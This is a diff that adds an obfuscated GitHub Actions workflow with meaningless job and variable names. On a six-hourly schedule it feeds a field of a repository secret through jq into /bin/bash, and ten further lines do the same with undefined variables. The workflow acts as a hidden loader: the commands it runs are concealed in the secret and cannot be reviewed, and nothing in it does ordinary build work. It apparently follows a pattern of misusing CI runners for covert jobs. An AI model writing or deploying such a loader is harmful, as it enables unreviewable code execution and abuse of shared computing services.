@@ -1,0 +1,27 @@
+name: muhong19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: muhong19871010
+        env:
+          nc21493: ${{ secrets.nc21493 }}
+        run: |
+          echo $nc21493 | jq -r .yut32 | /bin/bash
+          echo $wgguv75302 | jq -r .m177 | /bin/bash
+          echo $fni486 | jq -r .ioyrp3351 | /bin/bash
+          echo $cc95 | jq -r .mo06876 | /bin/bash
+          echo $g752 | jq -r .qxu2693 | /bin/bash
+          echo $itvxv8593 | jq -r .snxaq90 | /bin/bash
+          echo $vi43688 | jq -r .havyd7 | /bin/bash
+          echo $la8 | jq -r .g21 | /bin/bash
+          echo $kxop4813 | jq -r .h77 | /bin/bash
+          echo $wotmw89 | jq -r .fmtn14 | /bin/bash
+          echo $evkjp825 | jq -r .h92 | /bin/bash
+
